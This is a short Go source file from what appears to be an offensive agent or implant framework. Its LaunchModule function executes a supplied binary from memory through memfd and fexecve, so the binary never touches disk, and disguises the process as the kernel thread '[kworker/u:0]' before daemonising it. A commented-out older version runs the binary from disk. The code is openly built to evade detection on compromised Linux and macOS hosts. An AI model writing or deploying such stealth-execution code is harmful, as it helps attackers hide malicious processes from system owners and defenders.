//go:build !windows
// +build !windows

package agent

import (
	"os"

	"github.com/ariary/fileless-xec/pkg/exec"
	encryption "github.com/ariary/go-utils/pkg/encrypt"
)

//LaunchModule: execute module (not write into disk if on linux or macOS)
func LaunchModule(moduleBinaryContent string) (socket string) {
	mfd := exec.PrepareStealthExec(moduleBinaryContent)
	defer mfd.Close()
	fd := mfd.Fd()

	socket = SOCKET + "." + encryption.GenerateRandom()

	os.Setenv(COCO_SOCKET_ENVVAR, socket)
	environ := os.Environ()
	argv := []string{"[kworker/u:0]"}     //TODO: change it
	exec.FexecveDaemon(fd, argv, environ) //Without daemon it does not work
	return socket
}

// //LaunchModule: execute module (not write into disk if on linux or macOS)
// func LaunchModule(moduleBinaryContent string, socketName chan string) {
// 	binary := "dummy"
// 	//write binary file locally
// 	err := exec.WriteBinaryFile(binary, moduleBinaryContent)
// 	if err != nil {
// 		fmt.Println(err)
// 	}

// 	//execute it
// 	name := SOCKET + "." + encryption.GenerateRandom()
// 	os.Setenv(COCO_SOCKET_ENVVAR, name)
// 	environ := os.Environ()
// 	socketName <- name
// 	err = exec.UnstealthyExec(binary, nil, environ)
// 	fmt.Println(err)
// }
